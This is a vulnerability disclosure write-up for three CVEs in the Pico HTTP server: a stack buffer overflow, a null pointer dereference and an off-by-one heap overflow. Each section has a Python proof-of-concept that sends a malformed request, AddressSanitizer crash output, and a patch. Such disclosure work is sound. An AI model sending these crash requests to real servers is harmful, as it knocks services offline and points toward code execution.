# CVE-2024-22087

I discovered a remote stack buffer overflow vulnerability in the Pico HTTP server through commit f3b69a6 in the function void route() at main.c, line 81:

```
 GET(uri) { 
   char file_name[255]; 
   sprintf(file_name, "%s%s", PUBLIC_DIR, uri); 
```

Any project that utilizes pico is vulnerable to remote code execution.  I have outlined the reproduction steps below, and offer some mitigations that can be implemented to protect yourself.

### Makefile Modifications

The following modifications were made to the Makefile to compile pico with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the stack buffer overflow vulnerability:

```
all: server

clean:
	@rm -rf *.o
	@rm -rf server

server: main.o httpd.o
	gcc -o server $^ -fsanitize=address -g

main.o: main.c httpd.h
	gcc -c -o main.o main.c -fsanitize=address -g

httpd.o: httpd.c httpd.h
	gcc -c -o httpd.o httpd.c -fsanitize=address -g

```

### Compiling Pico

```
$ make
```

### Proof of Concept Python3 Script

Save the following script to a file named poc.py. The script will send an HTTP request with a malformed URI  (2,000,000 bytes long) to Pico and wait for a response:

```
#!/usr/bin/env python3

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8000))
sock.send(b"GET /"+b"C"*2000000+b"HTTP/1.1\r\nHost:localhost:8000\r\n\r\n")
response = sock.recv(4096)
sock.close()

```

### Starting Pico

```
./server
```

### Executing our Python3 Script

```
# python3 poc.py
```

### Address Sanitizer Output

The following output was produced by address sanitizer: 

```
==960119==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f214c10015f at pc 0x7f214e09215c bp 0x7ffe88c08220 sp 0x7ffe88c079e0
WRITE of size 65487 at 0x7f214c10015f thread T0                                                                                                                                 
    #0 0x7f214e09215b in __interceptor_vsprintf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1765
    #1 0x7f214e09233e in __interceptor_sprintf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1808
    #2 0x556476f2cd71 in route /home/kali/projects/fuzzing/pico/main.c:81
    #3 0x556476f2e336 in respond /home/kali/projects/fuzzing/pico/httpd.c:222
    #4 0x556476f2d199 in serve_forever /home/kali/projects/fuzzing/pico/httpd.c:67
    #5 0x556476f2c4d3 in main /home/kali/projects/fuzzing/pico/main.c:13
    #6 0x7f214de456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #7 0x7f214de45784 in __libc_start_main_impl ../csu/libc-start.c:360
    #8 0x556476f2c3b0 in _start (/home/kali/projects/fuzzing/pico/server+0x33b0) (BuildId: f62da5ef1f726838c2864638756f4930a324ceb6)

Address 0x7f214c10015f is located in stack of thread T0 at offset 351 in frame
    #0 0x556476f2c7e0 in route /home/kali/projects/fuzzing/pico/main.c:44

  This frame has 2 object(s):
    [32, 52) 'index_html' (line 48)
    [96, 351) 'file_name' (line 80) <== Memory access at offset 351 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1765 in __interceptor_vsprintf
Shadow bytes around the buggy address:
  0x7f214c0ffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c0fff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c0fff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c100000: f1 f1 f1 f1 00 00 04 f2 f2 f2 f2 f2 00 00 00 00
  0x7f214c100080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7f214c100100: 00 00 00 00 00 00 00 00 00 00 00[07]f3 f3 f3 f3
  0x7f214c100180: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c100200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c100280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c100300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f214c100380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==960119==ABORTING

```

This error is caused by writing data that exceeds the allocated buffer size. In this case, the buffer 'file_name' defined in the route function with a size of 255 bytes is overflowing. The overflow is occurring in the sprintf call, where you concatenate PUBLIC_DIR with uri or other strings to form a file path. If the combined length of these strings exceeds 255 characters, it will overflow the file_name buffer.

### Mitigation

To quickly mitigate this vulnerability, replace sprintf with snprintf, which allows you to specify the maximum number of characters to be written, including the null terminator. This prevents the stack buffer overflow by truncating the string if it exceeds the specified length.

Buffer overflow vulnerability:

```
sprintf(file_name, "%s%s", PUBLIC_DIR, uri);
```

Modified code preventing a buffer overflow:

```
snprintf(file_name, sizeof(file_name), "%s%s", PUBLIC_DIR, uri);
```

### References

* https://cwe.mitre.org/data/definitions/121.html
* https://owasp.org/www-community/vulnerabilities/Buffer_Overflow
* https://github.com/google/sanitizers/wiki/AddressSanitizer
* https://www.cve.org/CVERecord?id=CVE-2024-22087

# CVE-2024-24340

While executing my fuzz tests, I discovered a null pointer dereference in void respond(int slot) at httpd.c, lines 201-215:

https://github.com/foxweb/pico/blob/f3b69a65d7f8cd1ab0ecb027ae6d02881e8d83f7/httpd.c#L199-L210

Any project that utilizes pico is potentially vulnerable.  I have outlined the reproduction steps below, and offer some mitigations that can be implemented to protect yourself.

### Makefile Modifications

The following modifications were made to the Makefile to compile pico with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the null pointer derefeernce:

```
all: server

clean:
	@rm -rf *.o
	@rm -rf server

server: main.o httpd.o
	gcc -o server $^ -fsanitize=address -g

main.o: main.c httpd.h
	gcc -c -o main.o main.c -fsanitize=address -g

httpd.o: httpd.c httpd.h
	gcc -c -o httpd.o httpd.c -fsanitize=address -g

```

### Compiling Pico

```
$ make
```

### Proof of Concept Python3 Script

Save the following script to a file named poc.py. The script will send an malformed HTTP request to Pico and wait for a response:

```
#!/usr/bin/env python3

import socket

req = b'GET /hello HTTP/1.1\r\n%??%\x00? localhost:8000\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n\r\n\r\n'
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8000))
sock.send(req)
response = sock.recv(4096)
sock.close()
```

### Starting Pico

```
./server
```

### Executing our Python3 Script

```
# python3 poc.py
```

### Address Sanitizer Output

The following output was produced by address sanitizer: 

```
==338311==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x5589921650ea bp 0x7fff005bbce0 sp 0x7fff005bbca0 T0)
==338311==The signal is caused by a READ memory access.
==338311==Hint: address points to the zero page.
    #0 0x5589921650ea in respond /home/kali/projects/fuzzing/pico/httpd.c:200
    #1 0x558992164199 in serve_forever /home/kali/projects/fuzzing/pico/httpd.c:67
    #2 0x5589921634d3 in main /home/kali/projects/fuzzing/pico/main.c:13
    #3 0x7f0f3a8456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x7f0f3a845784 in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x5589921633b0 in _start (/home/kali/projects/fuzzing/pico/server+0x33b0) (BuildId: f62da5ef1f726838c2864638756f4930a324ceb6)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/kali/projects/fuzzing/pico/httpd.c:200 in respond
==338311==ABORTING

```

ASan indicates a segmentation fault (SEGV) encountered by the program, specifically during a READ memory operation at an unknown address 0x000000000000, which is typically indicative of a null pointer dereference. The error emerged in the respond function located in httpd.c at line 200, as part of the execution flow that started from the main function in main.c at line 13, went through the serve_forever function in httpd.c at line 67, and finally reached respond. The address involved points to the zero page, a memory area that is not accessible to programs under normal circumstances, and this access is what triggered the segmentation fault.

### Mitigation

The issue arises because strtok might return a NULL pointer if it doesn't find the token it's looking for, and the code isn't checking for that before dereferencing val. When you dereference a NULL pointer (as in *val), it leads to undefined behavior, often resulting in a segmentation fault. To fix this, you should check if val is NULL before attempting to use it. 

https://github.com/foxweb/pico/blob/f3b69a65d7f8cd1ab0ecb027ae6d02881e8d83f7/httpd.c#L199-L210


Updated code, preventing a null pointer dereference:

```
val = strtok(NULL, "\r\n");

if (val != NULL) {
// Remove leading whitespaces by advancing the pointer
    while (*val && *val == ' ') {
        val++;
    }

      h->name = key;
      h->value = val;
      h++;
      fprintf(stderr, "[H] %s: %s\n", key, val);
      t = val + 1 + strlen(val);
      if (t[1] == '\r' && t[2] == '\n')
        break;
    }
}
```


### References

* https://cwe.mitre.org/data/definitions/476.html
* https://owasp.org/www-community/vulnerabilities/Null_Dereference
* https://www.cve.org/CVERecord?id=CVE-2024-24340

# CVE-2024-24342

While executing my fuzz tests, I discovered an off-by-one buffer overflow in void respond(int slot), line 173:

https://github.com/foxweb/pico/blob/f3b69a65d7f8cd1ab0ecb027ae6d02881e8d83f7/httpd.c#L173

Any project that utilizes pico is potentially vulnerable.  I have outlined the reproduction steps below, and offer some mitigations that can be implemented to protect yourself.

### Makefile Modifications

The following modifications were made to the Makefile to compile pico with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the off-by-one buffer overflow:

```
all: server

clean:
	@rm -rf *.o
	@rm -rf server

server: main.o httpd.o
	gcc -o server $^ -fsanitize=address -g

main.o: main.c httpd.h
	gcc -c -o main.o main.c -fsanitize=address -g

httpd.o: httpd.c httpd.h
	gcc -c -o httpd.o httpd.c -fsanitize=address -g

```

### Compiling Pico

```
$ make
```

### Proof of Concept Python3 Script

Save the following script to a file named poc.py. The script will send an HTTP request with a malformeed 'Host' header to the pico server:

```
#!/usr/bin/env python3

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8000))
sock.send(b"GET /hello HTTP/1.1\r\n"+b"C"*65534+b" localhost:8000\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n\r\n\r\n")
response = sock.recv(4096)
sock.close()
```

### Starting Pico

```
./server
```

### Executing our Python3 Script

```
# python3 poc.py
```

### Address Sanitizer Output

The following output was produced by address sanitizer: 

```
==356968==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6310000107ff at pc 0x55ae6c37ef26 bp 0x7ffd53a18ad0 sp 0x7ffd53a18ac8                                  
WRITE of size 1 at 0x6310000107ff thread T0                                           
    #0 0x55ae6c37ef25 in respond /home/kali/projects/fuzzing/pico/httpd.c:173
    #1 0x55ae6c37e199 in serve_forever /home/kali/projects/fuzzing/pico/httpd.c:67
    #2 0x55ae6c37d4d3 in main /home/kali/projects/fuzzing/pico/main.c:13
    #3 0x7f5394ed46c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x7f5394ed4784 in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x55ae6c37d3b0 in _start (/home/kali/projects/fuzzing/pico/server+0x33b0) (BuildId: f62da5ef1f726838c2864638756f4930a324ceb6)

0x6310000107ff is located 0 bytes after 65535-byte region [0x631000000800,0x6310000107ff)                                                                                   
allocated by thread T0 here:                                                          
    #0 0x7f53948d85bf in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x55ae6c37edcc in respond /home/kali/projects/fuzzing/pico/httpd.c:164
    #2 0x55ae6c37e199 in serve_forever /home/kali/projects/fuzzing/pico/httpd.c:67
    #3 0x55ae6c37d4d3 in main /home/kali/projects/fuzzing/pico/main.c:13
    #4 0x7f5394ed46c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/kali/projects/fuzzing/pico/httpd.c:173 in respond
Shadow bytes around the buggy address:
  0x631000010500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x631000010580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x631000010600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x631000010680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x631000010700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x631000010780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00[07]
  0x631000010800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x631000010880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x631000010900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x631000010980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x631000010a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==356968==ABORTING


```

ASan is indicating a 'heap-buffer-overflow' issue, which means the program tried to access memory beyond the allocated heap buffer. This specific error occurred during a write operation at the memory address 0x6310000107ff. This is a common off-by-one vulnerability that can lead to crashes, unpredictable behavior, or security risks. 

The overflow is happening in the function `respond` within the file `httpd.c` at line 173, during the execution the server program (pico/server). This function was called by `serve_forever` (httpd.c:67), which in turn was called by the `main` function (main.c:13).


### Mitigation

The error message from ASan points to an off-by-one error on the line `buf[rcvd] = '\0';` in the respond function. This line attempts to null-terminate the buffer received from the recv function, but it doesn't account for the fact that the recv function might fill the entire buffer, leaving no space for the null terminator.

https://github.com/foxweb/pico/blob/f3b69a65d7f8cd1ab0ecb027ae6d02881e8d83f7/httpd.c#L173

To fix this issue, you need to ensure that recv leaves room for the null terminator in the buffer. You can do this by receiving one less byte than the buffer size. Furthermore, it's good practice to initialize the buffer with zeros to avoid any undefined behavior.

Here's the modified version of the respond function with the necessary corrections:

```
void respond(int slot) {
  int rcvd;

  buf = malloc(BUF_SIZE);
  memset(buf, 0, BUF_SIZE);  // Initialize buffer with zeros
  // Receive up to BUF_SIZE - 1 bytes to leave room for the null terminator
  rcvd = recv(clients[slot], buf, BUF_SIZE - 1, 0);

  if (rcvd < 0) // receive error
    fprintf(stderr, ("recv() error\n"));
  else if (rcvd == 0) // receive socket closed
    fprintf(stderr, "Client disconnected unexpectedly.\n");
  else // message received
  {
    buf[rcvd] = '\0'; // Safe to add null terminator

    // ... (rest of your code)
  }

  // ... (rest of your code)
}

```

- Buffer Initialization: memset(buf, 0, BUF_SIZE); initializes the buffer with zeros, ensuring all elements are set to '\0' before receiving data.
- Adjusted recv Size: The size parameter in recv(clients[slot], buf, BUF_SIZE - 1, 0); is set to BUF_SIZE - 1 to reserve space for the null terminator at the end of the buffer.

### References

* https://cwe.mitre.org/data/definitions/193.html
* https://owasp.org/www-community/vulnerabilities/Buffer_Overflow
* https://github.com/google/sanitizers/wiki/AddressSanitizer
* https://www.cve.org/CVERecord?id=CVE-2024-24342
